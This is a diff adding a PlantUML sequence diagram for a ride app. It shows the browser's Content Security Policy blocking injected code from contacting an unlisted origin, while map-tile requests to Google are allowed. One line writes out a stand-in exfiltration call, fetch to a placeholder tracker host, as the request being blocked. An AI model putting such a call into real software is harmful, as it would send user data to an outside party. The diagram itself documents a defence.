@@ -1,0 +1,33 @@
+@startuml
+title UML sequence behaviour — Block a request to an origin off the list
+skinparam backgroundColor #FFFFFF
+skinparam shadowing false
+skinparam roundcorner 12
+skinparam defaultFontName Arial
+skinparam ArrowColor #344054
+skinparam rectangle {
+  BorderColor #344054
+  FontColor #101828
+}
+skinparam package {
+  BorderColor #667085
+  FontColor #101828
+  BackgroundColor #F9FAFB
+}
+box "Frontend — Ride app" #E0F2FE
+  participant "Injected or mistaken code" as code
+  participant "PhotorealTiles" as tiles
+end box
+participant "Chrome or Edge (CSP enforcement)" as browser
+participant "Google Maps Platform" as gmaps
+participant "Other origin" as other
+code -> browser : fetch("https://tracker.example/collect")
+browser -> browser : connect-src does not list the origin
+browser --> code : Blocked; securitypolicyviolation event (L2-131 AC3)
+note over other : Never contacted
+== Rider has given a Google key ==
+tiles -> browser : fetch tiles from https://tile.googleapis.com with the key
+browser -> gmaps : Allowed by connect-src
+gmaps --> tiles : Tiles
+note over tiles : Without a key, no request to Google is made (L2-066)
+@enduml
